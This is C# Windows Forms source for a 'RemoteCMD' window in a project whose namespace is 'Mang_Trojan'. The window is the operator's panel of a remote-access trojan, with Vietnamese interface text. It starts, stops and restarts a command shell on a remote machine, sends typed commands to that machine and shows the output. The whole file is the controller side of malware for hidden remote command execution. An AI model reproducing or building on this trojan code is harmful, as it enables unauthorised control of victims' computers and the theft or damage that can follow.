using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Mang_Trojan.form
{
    public partial class RemoteCMD : Form
    {
        private bool running = false;
        private delegate void AddTextbox(string data);
        RemoteObject.ScreenObject hostInstance;
        public RemoteCMD(RemoteObject.ScreenObject hostInstance)
        {
            InitializeComponent();
            this.hostInstance = hostInstance;
            textBox2.Enabled = false;
            button1.Enabled = false;
            this.Text = "Điều khiển CMD "+hostInstance.GetComputerName() ;
           
        }

      

        private void startToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!running)
            {
                hostInstance.RemoteCmd();
                textBox2.Enabled = true;
                button1.Enabled = true;
                running = true;
                GetData();
            }
            else
            {
                MessageBox.Show("Điều khiển Cmd đã hoạt động.");
            }
        }

        private void stopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (running)
            {
              hostInstance.Stop();
                running = false;
                textBox2.Enabled = false;
                button1.Enabled = false;
            }
            else
            {
                MessageBox.Show("Điều khiển Cmd chưa hoạt động.");
            }
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (running)
            {
                hostInstance.Restart();
                GetData();
            }
            else
            {
                MessageBox.Show("Điều khiển Cmd chưa hoạt động.");
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
           hostInstance.Write(textBox2.Text);
            textBox2.Text = string.Empty;
            GetData();
        }
        public void AddToTextbox(string data)
        {
            if (textBox1.InvokeRequired)
            {
                textBox1.Invoke(new AddTextbox(AddToTextbox), new object[] { data });
            }
            else
            {
                textBox1.Text += data.ToString();
            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            textBox1.SelectionStart = textBox1.Text.Length;
            textBox1.ScrollToCaret();
            textBox1.Refresh();
        }

        private void GetData()
        {
           
            string data = hostInstance.GetResponse();
            AddToTextbox(data);
        }
    }
}
